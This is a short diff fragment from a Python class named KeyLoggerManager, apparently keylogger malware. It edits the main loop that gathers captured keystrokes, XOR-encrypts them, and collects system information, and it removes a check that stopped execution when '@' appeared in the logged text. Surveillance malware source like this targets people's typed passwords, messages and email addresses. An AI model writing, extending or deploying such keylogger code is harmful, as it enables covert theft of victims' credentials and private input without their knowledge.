@@ -18,12 +18,9 @@ class KeyLoggerManager:
           self.start.start_logging()
 
           while True:
+               self.start.stoplogging()
                time.sleep(self.TIME)
                text =''.join(self.start.get_logged_keys())
-
-               if '@' in text:
-                   exit()
-
                xor=self.xor.xor_encrypt_decrypt(text,key)
                now=datetime.now()
                data_for_system=self.start.system_information()
